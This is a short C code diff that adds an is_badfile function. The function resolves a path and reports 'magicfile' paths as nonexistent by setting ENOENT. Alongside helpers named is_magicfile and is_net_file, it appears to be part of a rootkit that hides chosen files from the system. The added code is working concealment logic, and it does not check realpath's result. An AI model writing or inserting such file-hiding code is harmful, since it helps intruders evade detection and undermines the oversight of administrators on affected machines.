@@ -49,6 +49,25 @@ int is_magicfile(const char *filename){
 }
 
 /*
+ * Function:  is_badfile
+ * --------------------
+ * wraps is_magifile, uses it joining the realpath
+ * if source or destination are one of the magicfiles it just returns 'ENOENT' (-1)
+ */
+int is_badfile(const char *pathname){
+    char realpathname[PATH_MAX];
+    realpath(pathname, realpathname);
+    if (is_magicfile(realpathname)){
+        #ifdef DEBUG
+        printf("[+] Magicfile found, returning NOENT: %s\n", realpathname);
+        #endif
+        errno = ENOENT;
+        return -1;
+    }
+    return 0;
+}
+
+/*
  * Function:  is_net_file
  * --------------------
  * check if filename has given prefix
